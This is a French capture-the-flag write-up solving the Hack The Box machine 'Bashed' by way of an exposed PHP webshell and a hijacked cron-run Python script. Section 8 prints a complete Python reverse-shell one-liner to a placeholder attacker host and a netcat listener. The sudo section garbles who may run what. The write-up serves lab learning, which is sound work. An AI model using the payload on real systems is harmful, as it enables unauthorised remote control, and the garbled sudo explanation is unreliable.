---

## title: "Hack The Box — Bashed : Writeup"  
date: 2026-08-25 00:00:00 +0200  
categories: [Box, HackTheBox]  
tags: [web, content-discovery, webshell, reverse-shell, privesc, sudo, cron, linux, HackTheBox]  
description: "Résolution de la machine Bashed sur Hack The Box : reconnaissance des services, découverte d'un répertoire caché, exploitation d'un webshell PHP et élévation de privilèges via un script exécuté avec les privilèges de scriptmanager."
image:
  path: /assets/img/htb/bashed/bashed-banner.png 
  alt: bashed Banner
    
---

# Hack The Box — Bashed

## Informations sur la machine

- **Cible** : `10.129.71.159`
    
- **Système d'exploitation** : Linux
    
- **Difficulté** : Facile

## 1. Reconnaissance avec Nmap

La première étape consiste à identifier les services accessibles sur la machine cible et à déterminer les différentes surfaces d'attaque disponibles.

J'utilise Nmap avec les options `-sC` (scripts par défaut) et `-sV` (détection de version) afin d'obtenir davantage d'informations sur les services accessibles.

```bash
nmap -sC -sV 10.129.71.159
```

**Résultat :**

![nmap resultat](/assets/img/htb/bashed/nmap_result.png)

Le scan révèle que seul le **port 80**, correspondant au service HTTP, est ouvert.

Je me rends donc ensuite sur l'application web à l'adresse :

`http://10.129.71.159`

![home page](/assets/img/htb/bashed/home_page.png)

---

## 2. Découverte de contenu Web

Après avoir identifié le serveur web, je passe à la phase de **content discovery** afin de rechercher d'éventuels fichiers ou répertoires cachés.

J'utilise Gobuster avec une wordlist commune et plusieurs extensions :

```bash
gobuster dir -u http://10.129.71.159 -w /usr/share/wordlists/dirb/common.txt -x php,txt,html,js 2>/dev/null
```

**Résultat :**

![gobuster](/assets/img/htb/bashed/gobuster.png)

Le scan permet notamment d'identifier un répertoire caché :

`/dev`

Je me rends donc à l'adresse :

`http://10.129.71.159/dev/`

![dev](/assets/img/htb/bashed/dev.png)

En explorant ce répertoire, je découvre un fichier nommé :

`phpbash.php`

En cliquant sur celui-ci, j'obtiens ce qui s'apparente à un **webshell PHP semi-interactif**.

![phpbash](/assets/img/htb/bashed/phpbash.png)

---

## 3. Exploitation du Webshell

Afin de déterminer sous quel utilisateur les commandes sont exécutées, j'utilise la commande :

```bash
whoami
```

Le résultat indique que je suis connecté en tant que :

`www-data`

![whoami](/assets/img/htb/bashed/whoami.png)

Je peux donc maintenant utiliser ce webshell pour effectuer différentes opérations sur la machine.

---

## 4. Récupération du flag utilisateur

Je me rends dans le répertoire personnel de l'utilisateur `arrexel` afin de rechercher le fichier `user.txt` contenant le premier flag.

```bash
cd /home/arrexel
ls
```

![user](/assets/img/htb/bashed/user.png)

Le fichier `user.txt` est présent. Je peux donc afficher son contenu :

```bash
cat user.txt
```

**Flag utilisateur** :

`62**************************6253`


---

## 5. Énumération des privilèges

Après avoir obtenu un accès à la machine en tant que `www-data`, je cherche maintenant à déterminer si cet utilisateur possède des privilèges particuliers.

J'utilise pour cela :

```bash
sudo -l
```

**Résultat :**

![sudo](/assets/img/htb/bashed/sudo.png)

On constate que l'utilisateur `www-data` peut exécuter une commande avec les privilèges de `root` sans avoir à fournir de mot de passe.

La commande concernée est :

`scriptmanager`

Cette information constitue une piste intéressante pour l'escalade de privilèges.

---

## 6. Analyse du répertoire `/scripts`

Je me déplace à la racine du système et j'utilise `ls -l` afin d'examiner les différents répertoires.

```bash
cd /
ls -l
```

![decouverte](/assets/img/htb/bashed/decouverte.png)

Je remarque notamment la présence d'un répertoire :

`/scripts`

Celui-ci appartient à l'utilisateur `scriptmanager` et possède les permissions :

`drwxrwxr--`

Cela signifie que l'accès au répertoire est limité à son propriétaire et aux utilisateurs appartenant à son groupe.

En entrant dans le répertoire, je constate la présence de deux fichiers :

- `test.txt`
    
- `test.py`
    

![contenu](/assets/img/htb/bashed/contenu.png)

Je dois cependant pouvoir lire le contenu de ces fichiers avec les privilèges de `scriptmanager`.

J'utilise donc :

```bash
sudo -u scriptmanager cat /scripts/test.py
```

![test](/assets/img/htb/bashed/test.png)

---

## 7. Analyse du script `test.py`

Le contenu du script permet de comprendre son fonctionnement.

On constate que le script recrée le fichier `test.txt` régulièrement, probablement grâce à une **tâche cron**.

Cela signifie notamment que le fichier est automatiquement recréé lorsqu'il est supprimé ou déplacé.

Cette automatisation constitue une piste intéressante pour l'escalade de privilèges.

---

## 8. Exploitation de la tâche automatisée

Puisque le script `test.py` est exécuté automatiquement, je décide de modifier son contenu afin qu'il établisse une connexion vers ma machine d'attaque.

L'objectif est d'obtenir un **reverse shell**.

Je remplace donc le contenu du fichier par le payload suivant :

```bash
echo 'import socket,subprocess,os;s=socket.socket();s.connect(("attacker_ip",attacker_port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])' > /scripts/test.py
```

Je lance simultanément un listener Netcat sur ma machine :

```bash
nc -lnvp 444
```

[Capture d'écran]

Après quelques instants, le script est exécuté et je reçois une connexion sur mon listener.

J'obtiens alors un reverse shell.

---

## 9. Obtention du shell root

Je vérifie sous quel utilisateur le reverse shell est exécuté :

```bash
whoami
```

Le résultat indique que je suis connecté en tant que :

`root`

L'escalade de privilèges est donc réussie.

Je peux maintenant me déplacer dans le répertoire personnel de `root` afin de récupérer le dernier flag :

```bash
cd /root
ls
cat root.txt
```

**Flag root** :

`c3**************************3438`

---

## 10. Chaîne d'exploitation (Kill Chain)

La compromission de la machine peut être résumée ainsi :

```text
Nmap
   │
   ▼
Port 80 / HTTP
   │
   ▼
Content Discovery avec Gobuster
   │
   ▼
Découverte du répertoire /dev
   │
   ▼
Découverte de phpbash.php
   │
   ▼
Webshell PHP
   │
   ▼
Shell www-data
   │
   ▼
Accès à /home/arrexel/user.txt
   │
   ▼
Flag User
   │
   ▼
sudo -l
   │
   ▼
Privilèges sur scriptmanager
   │
   ▼
Analyse du répertoire /scripts
   │
   ▼
Analyse de test.py
   │
   ▼
Script exécuté automatiquement
   │
   ▼
Modification de test.py
   │
   ▼
Reverse Shell
   │
   ▼
Shell Root
   │
   ▼
/root/root.txt
   │
   ▼
Flag Root
```

---

## 11. Ce que j'ai appris

Cette machine, bien que classée **Facile**, m'a permis de mettre en pratique plusieurs notions importantes.

1. **L'importance du content discovery** : L'utilisation de Gobuster permet de découvrir des répertoires qui ne sont pas forcément visibles depuis la page d'accueil. Dans ce cas, la découverte de `/dev` a permis d'identifier directement le point d'entrée de la machine.
    
2. **L'exploitation d'un webshell** : La découverte de `phpbash.php` montre l'importance d'analyser les fichiers accessibles sur une application web. Un simple fichier PHP exposé peut permettre d'obtenir une exécution de commandes sur le serveur.
    
3. **L'énumération des privilèges sudo** : Après avoir obtenu un accès initial, la commande `sudo -l` constitue une étape importante pour déterminer les possibilités d'escalade de privilèges.
    
4. **L'analyse des tâches automatisées** : L'analyse de `test.py` permet de comprendre qu'un script est exécuté régulièrement et recrée automatiquement `test.txt`. L'exploitation de ce mécanisme permet finalement d'obtenir un reverse shell.
    
5. **L'importance de l'énumération après le premier accès** : L'obtention d'un shell `www-data` ne signifie pas que la compromission est terminée. Il faut continuer à énumérer la machine afin d'identifier les possibilités d'escalade de privilèges.
